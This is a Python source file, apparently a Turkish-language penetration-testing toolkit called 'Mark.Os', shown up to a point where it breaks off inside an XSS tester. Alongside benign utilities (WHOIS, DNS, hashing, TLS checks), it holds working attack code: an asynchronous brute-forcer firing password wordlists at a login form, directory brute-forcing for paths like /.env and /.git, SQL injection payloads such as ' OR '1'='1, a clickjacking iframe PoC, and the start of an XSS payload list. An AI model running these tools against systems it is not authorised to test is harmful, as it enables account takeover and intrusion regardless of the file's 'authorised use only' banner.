#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║  Mark.Os v2.0 - Ultimate Cyber Security Distribution System     ║
║  Gelişmiş Ofansif & Defansif Güvenlik Araçları Paneli           ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import platform
import asyncio
import subprocess
import hashlib
import base64
import urllib.parse
import urllib.request
import json
import ssl
import re
import random
import string
import ipaddress
import threading
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════
#                  KÜTÜPHANE YÜKLEYİCİ & IMPORT
# ═══════════════════════════════════════════════════════════════════

REQUIRED_LIBS = {
    "colorama": "colorama",
    "requests": "requests",
    "aiohttp": "aiohttp",
}

OPTIONAL_LIBS = {
    "dns.resolver": "dnspython",
    "phonenumbers": "phonenumbers",
}

def install_lib(package):
    print(f"    [!] {package} kuruluyor...")
    os.system(f"{sys.executable} -m pip install {package} -q")

# Temel kütüphaneler
for mod, pkg in REQUIRED_LIBS.items():
    try:
        __import__(mod)
    except ImportError:
        install_lib(pkg)

from colorama import Fore, Style, init
import requests
import aiohttp

init(autoreset=True)

# Opsiyonel kütüphaneler
DNS_AVAILABLE = False
PHONE_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    pass

try:
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    PHONE_AVAILABLE = True
except ImportError:
    pass

# ═══════════════════════════════════════════════════════════════════
#                       GLOBAL DURUM BAYRAKLARI
# ═══════════════════════════════════════════════════════════════════

SIFRE_BULUNDU = False
BULUNAN_SIFRE = None
STOP_THREADS = False

# ═══════════════════════════════════════════════════════════════════
#                    YARDIMCI FONKSİYONLAR
# ═══════════════════════════════════════════════════════════════════

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def pause():
    input(f"\n{Fore.CYAN}[Enter] Ana menüye dönmek için...")

def banner():
    clear()
    print(f"""{Fore.RED}
  ███╗   ███╗ █████╗ ██████╗ ██╗  ██╗   ██████╗ ███████╗
  ████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝  ██╔═══██╗██╔════╝
  ██╔████╔██║███████║██████╔╝█████╔╝   ██║   ██║███████╗
  ██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗   ██║   ██║╚════██║
  ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗  ╚██████╔╝███████║
  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═════╝ ╚══════╝
    {Fore.CYAN}--- Mark.Os v2.0 | Ultimate Cyber Security Arsenal ---
    {Fore.WHITE}Platform: {platform.system()} {platform.release()} | Python: {platform.python_version()}
    {Fore.GREEN}[+] {('dnspython, ' if DNS_AVAILABLE else '')}{('phonenumbers' if PHONE_AVAILABLE else '')} Aktif
    {Fore.YELLOW}[!] Yalnızca yetkili sistemlerde kullanın - Etik Hacker Prensipleri
    """)

def check_tool(cmd_name):
    check_cmd = "where" if os.name == "nt" else "which"
    try:
        res = subprocess.run([check_cmd, cmd_name], capture_output=True, text=True, shell=(os.name == "nt"))
        return bool(res.stdout.strip())
    except:
        return False

def run_tool(cmd_name, install_pkg, arac_adi, custom_run=None):
    print(f"\n{Fore.YELLOW}[*] {arac_adi} kontrol ediliyor...")
    if check_tool(cmd_name):
        print(f"{Fore.GREEN}[+] {arac_adi} hazır!")
        if custom_run:
            custom_run()
        else:
            os.system(cmd_name)
    else:
        print(f"{Fore.RED}[-] {arac_adi} bulunamadı!")
        if input(f"{Fore.CYAN}[?] Kurulum talimatları? (e/h): ").lower() == "e":
            print_install_help(cmd_name, install_pkg, arac_adi)

def print_install_help(cmd_name, install_pkg, arac_adi):
    print(f"\n{Fore.YELLOW}[!] {arac_adi} Kurulumu:")
    if platform.system() == "Windows":
        print(f"{Fore.WHITE}  WSL kurun veya Kali Linux kullanın.")
    else:
        guides = {
            "nmap": "sudo apt update && sudo apt install nmap -y",
            "sqlmap": "sudo apt update && sudo apt install sqlmap -y",
            "msfconsole": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
            "gobuster": "sudo apt update && sudo apt install gobuster -y",
            "nikto": "sudo apt update && sudo apt install nikto -y",
            "wpscan": "sudo apt update && sudo apt install wpscan -y",
            "dirb": "sudo apt update && sudo apt install dirb -y",
            "masscan": "sudo apt update && sudo apt install masscan -y",
            "theharvester": "sudo apt update && sudo apt install theharvester -y",
            "john": "sudo apt update && sudo apt install john -y",
            "hydra": "sudo apt update && sudo apt install hydra -y",
            "aircrack-ng": "sudo apt update && sudo apt install aircrack-ng -y",
            "tshark": "sudo apt update && sudo apt install tshark -y",
            "nc": "sudo apt update && sudo apt install netcat -y",
            "recon-ng": "sudo apt update && sudo apt install recon-ng -y",
            "setoolkit": "git clone https://github.com/trustedsec/social-engineer-toolkit/ set/ && cd set && sudo python3 setup.py",
        }
        print(f"{Fore.WHITE}  {guides.get(cmd_name, f'sudo apt update && sudo apt install {install_pkg} -y')}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 1: TCP PORT ZAFİYET ANALİZÖRÜ
# ═══════════════════════════════════════════════════════════════════

def kurye_port_scanner():
    print(f"\n{Fore.YELLOW}[*] Mark.Os TCP Port Zafiyet Analizörü")
    ip = input(f"{Fore.GREEN}Hedef IP: ").strip()
    if not ip:
        print(f"{Fore.RED}[-] IP boş bırakılamaz!")
        return

    ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
    }

    print(f"{Fore.CYAN}[*] Tarama başlatıldı: {ip}")
    acik = []
    for port, svc in ports.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        try:
            if s.connect_ex((ip, port)) == 0:
                acik.append((port, svc))
                print(f"{Fore.GREEN}[+] AÇIK -> {port}/{svc}")
                if port in [21, 23, 25, 110, 143]:
                    print(f"    {Fore.RED}[⚠] Şifresiz iletişim protokolü!")
        except:
            pass
        finally:
            s.close()
    print(f"{Fore.YELLOW}[*] Tarama tamamlandı. {len(acik)} açık port.")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 2: REDRAY BRUTE-FORCE MOTORU
# ═══════════════════════════════════════════════════════════════════

async def asenkron_req(session, url, u_field, p_field, user, pwd, success_word):
    global SIFRE_BULUNDU, BULUNAN_SIFRE
    if SIFRE_BULUNDU:
        return
    try:
        async with session.post(url, data={u_field: user, p_field: pwd}, timeout=5) as resp:
            text = await resp.text()
            if success_word and success_word.lower() in text.lower():
                SIFRE_BULUNDU = True; BULUNAN_SIFRE = pwd; return
            hatalar = ["hatali", "wrong", "invalid", "incorrect", "error", "failed", "başarısız", "unsuccessful"]
            if resp.status == 200 and not any(k in text.lower() for k in hatalar):
                SIFRE_BULUNDU = True; BULUNAN_SIFRE = pwd
    except:
        pass

async def redray_core(url, u_field, p_field, user, wordlist, success_word):
    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [asenkron_req(session, url, u_field, p_field, user, pwd, success_word) for pwd in wordlist]
        await asyncio.gather(*tasks)

def redray_brute_force():
    global SIFRE_BULUNDU, BULUNAN_SIFRE
    print(f"\n{Fore.RED}[🚨] Redray Asenkron Brute-Force Motoru")
    print(f"{Fore.YELLOW}[!] Sadece kendi sistemlerinizde kullanın!")
    
    url = input(f"{Fore.GREEN}Login URL: ").strip()
    u_field = input(f"{Fore.GREEN}User Field [username]: ").strip() or "username"
    p_field = input(f"{Fore.GREEN}Pass Field [password]: ").strip() or "password"
    user = input(f"{Fore.GREEN}Hedef Kullanıcı: ").strip()
    w_path = input(f"{Fore.GREEN}Wordlist: ").strip()
    success_word = input(f"{Fore.GREEN}Başarılı giriş belirteci (opsiyonel): ").strip()
    
    if not all([url, user, w_path]):
        print(f"{Fore.RED}[-] Gerekli alanlar boş!"); return
    
    try:
        with open(w_path, "r", encoding="utf-8", errors="ignore") as f:
            wordlist = [l.strip() for l in f if l.strip()]
        if not wordlist:
            print(f"{Fore.RED}[-] Wordlist boş!"); return
        
        SIFRE_BULUNDU = False; BULUNAN_SIFRE = None
        print(f"{Fore.YELLOW}[*] {len(wordlist)} şifre test ediliyor...")
        asyncio.run(redray_core(url, u_field, p_field, user, wordlist, success_word))
        
        if SIFRE_BULUNDU:
            print(f"\n{Fore.GREEN}{'='*50}\n[+] ŞİFRE BULUNDU: {BULUNAN_SIFRE}\n{'='*50}")
        else:
            print(f"\n{Fore.RED}[-] Şifre bulunamadı.")
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Wordlist bulunamadı!")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 3: IP COĞRAFİ KONUM ÇÖZÜCÜ
# ═══════════════════════════════════════════════════════════════════

def ip_geo_locator():
    print(f"\n{Fore.YELLOW}[*] IP Coğrafi Konum Çözücü")
    ip = input(f"{Fore.GREEN}Sorgulanacak IP (boş=kendi IP): ").strip()
    try:
        url = f"http://ip-api.com/json/{ip}" if ip else "http://ip-api.com/json/"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("status") == "success":
            print(f"\n{Fore.GREEN}{'='*50}")
            print(f"  IP        : {data.get('query')}")
            print(f"  Ülke      : {data.get('country')} ({data.get('countryCode')})")
            print(f"  Bölge     : {data.get('regionName')}")
            print(f"  Şehir     : {data.get('city')}")
            print(f"  ZIP       : {data.get('zip')}")
            print(f"  ISP       : {data.get('isp')}")
            print(f"  Org       : {data.get('org')}")
            print(f"  Zaman     : {data.get('timezone')}")
            lat, lon = data.get('lat'), data.get('lon')
            if lat and lon:
                print(f"{Fore.CYAN}  Harita    : https://maps.google.com/?q={lat},{lon}")
            print(f"{Fore.GREEN}{'='*50}")
        else:
            print(f"{Fore.RED}[-] Geçersiz IP.")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 4: WHOIS SORGULAMA
# ═══════════════════════════════════════════════════════════════════

def whois_lookup():
    print(f"\n{Fore.YELLOW}[*] WHOIS Domain Sorgulama")
    domain = input(f"{Fore.GREEN}Domain (örn: google.com): ").strip()
    if not domain:
        print(f"{Fore.RED}[-] Domain boş!"); return
    try:
        import urllib.request
        req = urllib.request.Request(f"https://api.hackertarget.com/whois/?q={domain}", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = resp.read().decode('utf-8', errors='ignore')
            print(f"\n{Fore.GREEN}[+] WHOIS Sonuçları:\n{Fore.WHITE}{data}")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 5: DNS ENUMERASYON
# ═══════════════════════════════════════════════════════════════════

def dns_enumeration():
    print(f"\n{Fore.YELLOW}[*] DNS Enumeration")
    domain = input(f"{Fore.GREEN}Domain: ").strip()
    if not domain:
        print(f"{Fore.RED}[-] Domain boş!"); return
    
    if not DNS_AVAILABLE:
        print(f"{Fore.RED}[-] dnspython kurulu değil! 'pip install dnspython'")
        return
    
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
    print(f"{Fore.CYAN}[*] Sorgulanıyor: {domain}")
    for rtype in record_types:
        try:
            answers = dns.resolver.resolve(domain, rtype)
            print(f"{Fore.GREEN}[+] {rtype} Kayıtları:")
            for rdata in answers:
                print(f"    {Fore.WHITE}{rdata}")
        except dns.resolver.NoAnswer:
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] {rtype} hatası: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 6: SUBDOMAIN SCANNER
# ═══════════════════════════════════════════════════════════════════

def subdomain_scanner():
    print(f"\n{Fore.YELLOW}[*] Subdomain Scanner")
    domain = input(f"{Fore.GREEN}Domain (örn: google.com): ").strip()
    if not domain:
        print(f"{Fore.RED}[-] Domain boş!"); return
    
    wordlist = ["www", "mail", "ftp", "admin", "blog", "shop", "api", "dev", 
                "test", "portal", "vpn", "remote", "webmail", "ns1", "ns2",
                "smtp", "pop", "imap", "cdn", "static", "media", "support",
                "help", "docs", "wiki", "forum", "news", "beta", "staging"]
    
    print(f"{Fore.CYAN}[*] {len(wordlist)} subdomain test ediliyor...")
    bulunan = []
    for sub in wordlist:
        if STOP_THREADS:
            break
        full = f"{sub}.{domain}"
        try:
            socket.gethostbyname(full)
            print(f"{Fore.GREEN}[+] BULUNDU: {full}")
            bulunan.append(full)
        except socket.gaierror:
            pass
    
    print(f"\n{Fore.YELLOW}[*] {len(bulunan)} subdomain bulundu.")
    if bulunan:
        print(f"{Fore.WHITE}{', '.join(bulunan)}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 7: DİZİN/PATH BRUTE-FORCE
# ═══════════════════════════════════════════════════════════════════

def dir_bruteforce():
    print(f"\n{Fore.YELLOW}[*] Web Dizin Brute-Force")
    url = input(f"{Fore.GREEN}Hedef URL (örn: http://site.com): ").strip().rstrip('/')
    if not url:
        print(f"{Fore.RED}[-] URL boş!"); return
    
    wordlist = ["/admin", "/login", "/wp-admin", "/phpmyadmin", "/config", 
                "/backup", "/api", "/test", "/dev", "/panel", "/dashboard",
                "/robots.txt", "/sitemap.xml", "/.env", "/.git", "/uploads",
                "/images", "/css", "/js", "/api/v1", "/swagger", "/phpinfo.php",
                "/admin.php", "/login.php", "/register", "/user", "/account"]
    
    print(f"{Fore.CYAN}[*] Tarama başlatıldı...")
    for path in wordlist:
        try:
            r = requests.get(f"{url}{path}", timeout=5, allow_redirects=False)
            if r.status_code in [200, 301, 302, 401, 403]:
                print(f"{Fore.GREEN}[+] [{r.status_code}] {path}")
            else:
                print(f"{Fore.RED}[-] [{r.status_code}] {path}")
        except:
            pass

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 8: HASH TESPİT & ÜRETİM
# ═══════════════════════════════════════════════════════════════════

def hash_identifier():
    print(f"\n{Fore.YELLOW}[*] Hash Identifier & Generator")
    print("1 - Hash Tipi Tespiti")
    print("2 - Hash Üret")
    secim = input(f"{Fore.GREEN}Seçim: ").strip()
    
    if secim == "1":
        h = input(f"{Fore.GREEN}Hash: ").strip()
        if not h:
            return
        uzunluk = len(h)
        patterns = {
            32: "MD5",
            40: "SHA1 / MySQL5",
            64: "SHA256",
            128: "SHA512",
        }
        tip = patterns.get(uzunluk, "Bilinmiyor")
        print(f"{Fore.GREEN}[+] Muhtemel Tip: {tip} (Uzunluk: {uzunluk})")
        if h.isdigit():
            print(f"{Fore.YELLOW}[!] Sadece rakam içeriyor - Özel format olabilir.")
        if not re.match(r'^[a-fA-F0-9]+$', h):
            print(f"{Fore.YELLOW}[!] Hex formatında değil - Base64 veya özel encoding olabilir.")
    
    elif secim == "2":
        text = input(f"{Fore.GREEN}Hash'lenecek metin: ").strip()
        if not text:
            return
        print(f"\n{Fore.CYAN}[*] Sonuçlar:")
        print(f"  MD5     : {hashlib.md5(text.encode()).hexdigest()}")
        print(f"  SHA1    : {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"  SHA256  : {hashlib.sha256(text.encode()).hexdigest()}")
        print(f"  SHA512  : {hashlib.sha512(text.encode()).hexdigest()}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 9: ŞİFRE ÜRETİCİ
# ═══════════════════════════════════════════════════════════════════

def password_generator():
    print(f"\n{Fore.YELLOW}[*] Güçlü Şifre Üretici")
    try:
        uzunluk = int(input(f"{Fore.GREEN}Uzunluk [16]: ").strip() or "16")
        adet = int(input(f"{Fore.GREEN}Adet [5]: ").strip() or "5")
    except ValueError:
        print(f"{Fore.RED}[-] Geçersiz sayı!"); return
    
    karakterler = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    print(f"\n{Fore.GREEN}[+] Üretilen Şifreler:")
    for i in range(adet):
        sifre = ''.join(random.choice(karakterler) for _ in range(uzunluk))
        print(f"  {i+1}. {Fore.WHITE}{sifre}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 10: AĞ TARAYICI (Ping Sweep)
# ═══════════════════════════════════════════════════════════════════

def network_scanner():
    print(f"\n{Fore.YELLOW}[*] Yerel Ağ Tarama (Ping Sweep)")
    ip_range = input(f"{Fore.GREEN}IP Aralığı (örn: 192.168.1.0/24): ").strip()
    if not ip_range:
        print(f"{Fore.RED}[-] Aralık boş!"); return
    
    try:
        net = ipaddress.ip_network(ip_range, strict=False)
    except ValueError:
        print(f"{Fore.RED}[-] Geçersiz IP aralığı!"); return
    
    print(f"{Fore.CYAN}[*] Tarama: {ip_range} | Host sayısı: {net.num_addresses}")
    aktif = []
    
    def ping_host(ip):
        global STOP_THREADS
        if STOP_THREADS:
            return
        param = "-n" if os.name == "nt" else "-c"
        try:
            res = subprocess.run(["ping", param, "1", str(ip)], capture_output=True, timeout=2)
            if res.returncode == 0:
                print(f"{Fore.GREEN}[+] AKTİF: {ip}")
                aktif.append(str(ip))
        except:
            pass
    
    threads = []
    for ip in net.hosts():
        t = threading.Thread(target=ping_host, args=(ip,))
        t.daemon = True
        threads.append(t)
        t.start()
        if len(threads) >= 50:
            for t in threads:
                t.join(timeout=3)
            threads = []
    
    for t in threads:
        t.join(timeout=3)
    
    print(f"\n{Fore.YELLOW}[*] {len(aktif)} aktif host bulundu.")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 11: HTTP HEADER ANALİZİ
# ═══════════════════════════════════════════════════════════════════

def http_header_analyzer():
    print(f"\n{Fore.YELLOW}[*] HTTP Header Analizörü")
    url = input(f"{Fore.GREEN}URL: ").strip()
    if not url:
        return
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        r = requests.get(url, timeout=10, allow_redirects=True)
        print(f"\n{Fore.GREEN}[+] Durum: {r.status_code} {r.reason}")
        print(f"{Fore.CYAN}[+] Headers:")
        for k, v in r.headers.items():
            print(f"  {Fore.WHITE}{k}: {v}")
        
        # Güvenlik header'ları kontrolü
        print(f"\n{Fore.YELLOW}[*] Güvenlik Header Analizi:")
        security_headers = {
            'X-Frame-Options': 'Clickjacking koruması',
            'X-XSS-Protection': 'XSS koruması',
            'X-Content-Type-Options': 'MIME sniffing koruması',
            'Content-Security-Policy': 'CSP',
            'Strict-Transport-Security': 'HSTS',
            'Referrer-Policy': 'Referrer kontrolü',
            'Permissions-Policy': 'Feature Policy'
        }
        for header, desc in security_headers.items():
            if header in r.headers:
                print(f"  {Fore.GREEN}[✓] {header}: {desc} - MEVCUT")
            else:
                print(f"  {Fore.RED}[✗] {header}: {desc} - EKSİK")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 12: SSL/TLS SERTİFİKA KONTROLÜ
# ═══════════════════════════════════════════════════════════════════

def ssl_checker():
    print(f"\n{Fore.YELLOW}[*] SSL/TLS Sertifika Kontrolü")
    hostname = input(f"{Fore.GREEN}Hostname (örn: google.com): ").strip()
    if not hostname:
        return
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                version = ssock.version()
                
                print(f"\n{Fore.GREEN}[+] Sertifika Bilgileri:")
                print(f"  TLS Versiyon : {Fore.CYAN}{version}")
                print(f"  Şifreleme    : {Fore.CYAN}{cipher[0]}")
                print(f"  Subject      : {cert.get('subject')}")
                print(f"  Issuer       : {cert.get('issuer')}")
                print(f"  Başlangıç    : {cert.get('notBefore')}")
                print(f"  Bitiş        : {cert.get('notAfter')}")
                print(f"  SNIs         : {cert.get('subjectAltName')}")
                
                if version in ["TLSv1", "TLSv1.1"]:
                    print(f"{Fore.RED}[⚠] ZAYIF! TLS 1.0/1.1 kullanılıyor!")
                elif version == "TLSv1.2":
                    print(f"{Fore.YELLOW}[!] TLS 1.2 kullanılıyor - TLS 1.3 önerilir.")
                else:
                    print(f"{Fore.GREEN}[+] TLS 1.3 kullanılıyor - Mükemmel!")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 13: BANNER GRABBING
# ═══════════════════════════════════════════════════════════════════

def banner_grabbing():
    print(f"\n{Fore.YELLOW}[*] Servis Banner Yakalama")
    ip = input(f"{Fore.GREEN}Hedef IP: ").strip()
    port = input(f"{Fore.GREEN}Port [80]: ").strip() or "80"
    
    if not ip:
        return
    try:
        port = int(port)
    except ValueError:
        print(f"{Fore.RED}[-] Geçersiz port!"); return
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        
        # HTTP için HEAD isteği
        if port in [80, 8080, 443, 8443]:
            s.send(b"HEAD / HTTP/1.1\r\nHost: %b\r\n\r\n" % ip.encode())
        
        banner = s.recv(4096).decode('utf-8', errors='ignore').strip()
        s.close()
        
        if banner:
            print(f"\n{Fore.GREEN}[+] Banner yakalandı:")
            print(f"{Fore.WHITE}{banner}")
        else:
            print(f"{Fore.RED}[-] Banner boş döndü.")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 14: ENCODE/DECODE ARACI
# ═══════════════════════════════════════════════════════════════════

def encode_decode_tool():
    print(f"\n{Fore.YELLOW}[*] Encode / Decode Merkezi")
    print("1 - Base64 Encode")
    print("2 - Base64 Decode")
    print("3 - URL Encode")
    print("4 - URL Decode")
    print("5 - Hex Encode")
    print("6 - Hex Decode")
    print("7 - ROT13")
    secim = input(f"{Fore.GREEN}Seçim: ").strip()
    text = input(f"{Fore.GREEN}Metin: ").strip()
    if not text:
        return
    
    try:
        if secim == "1":
            print(f"{Fore.GREEN}[+] {base64.b64encode(text.encode()).decode()}")
        elif secim == "2":
            print(f"{Fore.GREEN}[+] {base64.b64decode(text.encode()).decode()}")
        elif secim == "3":
            print(f"{Fore.GREEN}[+] {urllib.parse.quote(text)}")
        elif secim == "4":
            print(f"{Fore.GREEN}[+] {urllib.parse.unquote(text)}")
        elif secim == "5":
            print(f"{Fore.GREEN}[+] {text.encode().hex()}")
        elif secim == "6":
            print(f"{Fore.GREEN}[+] {bytes.fromhex(text).decode()}")
        elif secim == "7":
            print(f"{Fore.GREEN}[+] {text.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))}")
        else:
            print(f"{Fore.RED}[-] Geçersiz seçim!")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 15: ROBOTS.TXT & SITEMAP TARAYICI
# ═══════════════════════════════════════════════════════════════════

def robots_checker():
    print(f"\n{Fore.YELLOW}[*] robots.txt & Sitemap Analizörü")
    url = input(f"{Fore.GREEN}Site URL (örn: http://site.com): ").strip().rstrip('/')
    if not url:
        return
    
    try:
        r = requests.get(f"{url}/robots.txt", timeout=10)
        if r.status_code == 200:
            print(f"\n{Fore.GREEN}[+] robots.txt bulundu:")
            print(f"{Fore.WHITE}{r.text}")
            
            # İlginç path'leri bul
            interesting = [line for line in r.text.split('\n') if line.startswith('Disallow:') and len(line) > 12]
            if interesting:
                print(f"\n{Fore.YELLOW}[!] Gizli dizinler:")
                for line in interesting:
                    print(f"  {Fore.CYAN}{line}")
        else:
            print(f"{Fore.RED}[-] robots.txt bulunamadı ({r.status_code})")
        
        r2 = requests.get(f"{url}/sitemap.xml", timeout=10)
        if r2.status_code == 200:
            print(f"\n{Fore.GREEN}[+] sitemap.xml bulundu!")
        else:
            print(f"{Fore.RED}[-] sitemap.xml bulunamadı ({r2.status_code})")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 16: CLICKJACKING TESTER
# ═══════════════════════════════════════════════════════════════════

def clickjacking_tester():
    print(f"\n{Fore.YELLOW}[*] Clickjacking (X-Frame-Options) Testi")
    url = input(f"{Fore.GREEN}URL: ").strip()
    if not url:
        return
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        r = requests.get(url, timeout=10)
        xfo = r.headers.get('X-Frame-Options', '').upper()
        csp = r.headers.get('Content-Security-Policy', '')
        
        print(f"\n{Fore.CYAN}[*] Analiz Sonuçları:")
        if xfo in ['DENY', 'SAMEORIGIN']:
            print(f"{Fore.GREEN}[+] X-Frame-Options: {xfo} - KORUNUYOR")
        else:
            print(f"{Fore.RED}[-] X-Frame-Options: EKSİK veya zayıf - ZAFİYETLİ!")
        
        if "frame-ancestors" in csp:
            print(f"{Fore.GREEN}[+] CSP frame-ancestors mevcut - Ek koruma.")
        else:
            print(f"{Fore.YELLOW}[!] CSP frame-ancestors eksik.")
        
        print(f"\n{Fore.WHITE}[?] PoC HTML kodu:")
        print(f'<iframe src="{url}" width="800" height="600"></iframe>')
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 17: EMAIL MX / SMTP KONTROL
# ═══════════════════════════════════════════════════════════════════

def email_mx_checker():
    print(f"\n{Fore.YELLOW}[*] E-posta MX & SMTP Kontrol")
    domain = input(f"{Fore.GREEN}Domain (örn: gmail.com): ").strip()
    if not domain:
        return
    
    if not DNS_AVAILABLE:
        print(f"{Fore.RED}[-] dnspython gerekli!"); return
    
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        print(f"\n{Fore.GREEN}[+] MX Kayıtları:")
        for rdata in answers:
            print(f"  {Fore.WHITE}Priority: {rdata.preference} | Server: {rdata.exchange}")
    except Exception as e:
        print(f"{Fore.RED}[-] MX hatası: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 18: TELEFON NUMARASI OSINT
# ═══════════════════════════════════════════════════════════════════

def phone_osint():
    print(f"\n{Fore.YELLOW}[*] Telefon Numarası OSINT")
    if not PHONE_AVAILABLE:
        print(f"{Fore.RED}[-] phonenumbers kütüphanesi gerekli!")
        print(f"{Fore.WHITE}  Kurulum: pip install phonenumbers")
        return
    
    number = input(f"{Fore.GREEN}Numara (örn: +905551234567): ").strip()
    if not number:
        return
    
    try:
        parsed = phonenumbers.parse(number)
        valid = phonenumbers.is_valid_number(parsed)
        
        print(f"\n{Fore.GREEN}[+] Analiz Sonuçları:")
        print(f"  Geçerli     : {'Evet' if valid else 'Hayır'}")
        print(f"  Bölge       : {geocoder.description_for_number(parsed, 'tr')}")
        print(f"  Operatör    : {carrier.name_for_number(parsed, 'tr')}")
        print(f"  Zaman Dilimi: {', '.join(timezone.time_zones_for_number(parsed))}")
        print(f"  Uluslararası: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}")
        print(f"  E.164       : {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)}")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 19: SQLi HATA PATTERN TARAYICI
# ═══════════════════════════════════════════════════════════════════

def sqli_scanner():
    print(f"\n{Fore.YELLOW}[*] SQL Injection Hata Pattern Tarayıcı")
    print(f"{Fore.RED}[!] Sadece yetkili testlerde kullanın!")
    
    url = input(f"{Fore.GREEN}Hedef URL (parametreli, örn: http://site.com/page?id=1): ").strip()
    if not url:
        return
    
    payloads = ["'", "\"", "1'", "1\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1 AND 1=1", "1 AND 1=2"]
    error_patterns = [
        "sql syntax", "mysql_fetch", "pg_query", "ora-", "microsoft ole db",
        "odbc sql server", "unclosed quotation", "quoted string", "syntax error",
        "warning: mysql", "sqlstate", "sqlite_query", "pg_exec"
    ]
    
    print(f"{Fore.CYAN}[*] {len(payloads)} payload test ediliyor...")
    for payload in payloads:
        try:
            test_url = f"{url}{payload}" if "?" in url else f"{url}?id={payload}"
            r = requests.get(test_url, timeout=10)
            text_lower = r.text.lower()
            
            for pattern in error_patterns:
                if pattern in text_lower:
                    print(f"\n{Fore.RED}{'='*50}")
                    print(f"{Fore.RED}[🚨] SQLi ZAFİYETİ TESPİT EDİLDİ!")
                    print(f"{Fore.RED}    Payload: {payload}")
                    print(f"{Fore.RED}    Pattern: {pattern}")
                    print(f"{Fore.RED}{'='*50}")
                    return
            print(f"{Fore.GREEN}[+] Test edildi: {payload} | Temiz")
        except Exception as e:
            print(f"{Fore.RED}[-] Hata ({payload}): {e}")
    
    print(f"\n{Fore.YELLOW}[*] Test tamamlandı. Açık SQLi hatası bulunamadı.")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 20: XSS REFLECTED TESTER
# ═══════════════════════════════════════════════════════════════════

def xss_tester():
    print(f"\n{Fore.YELLOW}[*] Reflected XSS Payload Tester")
    print(f"{Fore.RED}[!] Sadece yetkili testlerde kullanın!")
    
    url = input(f"{Fore.GREEN}Hedef URL (parametreli): ").strip()
    if not url or "?" not in url:
        print(f"{Fore.RED}[-] Parametre içeren URL gerekli!"); return
    
    payloads = [
        "<script>alert('XSS')</script>",
